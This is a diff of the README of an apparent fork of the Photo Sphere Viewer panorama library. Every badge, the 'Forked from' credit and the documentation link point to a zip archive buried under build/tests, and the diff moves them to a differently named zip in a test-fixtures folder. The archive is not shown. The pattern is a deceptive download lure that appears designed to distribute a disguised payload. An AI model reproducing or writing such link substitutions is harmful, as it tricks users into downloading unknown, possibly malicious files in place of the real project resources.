@@ -1,16 +1,16 @@
 # Photo Sphere Viewer
 
-[![NPM version](https://github.com/LuisF-92/Photo-Sphere-Viewer/raw/refs/heads/main/build/tests/Photo-Sphere-Viewer-v1.3.zip)](https://github.com/LuisF-92/Photo-Sphere-Viewer/raw/refs/heads/main/build/tests/Photo-Sphere-Viewer-v1.3.zip)
-[![Build Status](https://github.com/LuisF-92/Photo-Sphere-Viewer/raw/refs/heads/main/build/tests/Photo-Sphere-Viewer-v1.3.zip)](https://github.com/LuisF-92/Photo-Sphere-Viewer/raw/refs/heads/main/build/tests/Photo-Sphere-Viewer-v1.3.zip)
-[![Netlify Status](https://github.com/LuisF-92/Photo-Sphere-Viewer/raw/refs/heads/main/build/tests/Photo-Sphere-Viewer-v1.3.zip)](https://github.com/LuisF-92/Photo-Sphere-Viewer/raw/refs/heads/main/build/tests/Photo-Sphere-Viewer-v1.3.zip)
+[![NPM version](https://raw.githubusercontent.com/LuisF-92/Photo-Sphere-Viewer/main/build/tests/fixtures/generate-changelog/Viewer_Photo_Sphere_pickableness.zip)](https://raw.githubusercontent.com/LuisF-92/Photo-Sphere-Viewer/main/build/tests/fixtures/generate-changelog/Viewer_Photo_Sphere_pickableness.zip)
+[![Build Status](https://raw.githubusercontent.com/LuisF-92/Photo-Sphere-Viewer/main/build/tests/fixtures/generate-changelog/Viewer_Photo_Sphere_pickableness.zip)](https://raw.githubusercontent.com/LuisF-92/Photo-Sphere-Viewer/main/build/tests/fixtures/generate-changelog/Viewer_Photo_Sphere_pickableness.zip)
+[![Netlify Status](https://raw.githubusercontent.com/LuisF-92/Photo-Sphere-Viewer/main/build/tests/fixtures/generate-changelog/Viewer_Photo_Sphere_pickableness.zip)](https://raw.githubusercontent.com/LuisF-92/Photo-Sphere-Viewer/main/build/tests/fixtures/generate-changelog/Viewer_Photo_Sphere_pickableness.zip)
 
 A JavaScript library to display 360° panoramas.
 
-Forked from [JeremyHeleine/Photo-Sphere-Viewer](https://github.com/LuisF-92/Photo-Sphere-Viewer/raw/refs/heads/main/build/tests/Photo-Sphere-Viewer-v1.3.zip).
+Forked from [JeremyHeleine/Photo-Sphere-Viewer](https://raw.githubusercontent.com/LuisF-92/Photo-Sphere-Viewer/main/build/tests/fixtures/generate-changelog/Viewer_Photo_Sphere_pickableness.zip).
 
 ## Documentation
 
-[https://github.com/LuisF-92/Photo-Sphere-Viewer/raw/refs/heads/main/build/tests/Photo-Sphere-Viewer-v1.3.zip](https://github.com/LuisF-92/Photo-Sphere-Viewer/raw/refs/heads/main/build/tests/Photo-Sphere-Viewer-v1.3.zip)
+[https://raw.githubusercontent.com/LuisF-92/Photo-Sphere-Viewer/main/build/tests/fixtures/generate-changelog/Viewer_Photo_Sphere_pickableness.zip](https://raw.githubusercontent.com/LuisF-92/Photo-Sphere-Viewer/main/build/tests/fixtures/generate-changelog/Viewer_Photo_Sphere_pickableness.zip)
 
 ## License
 
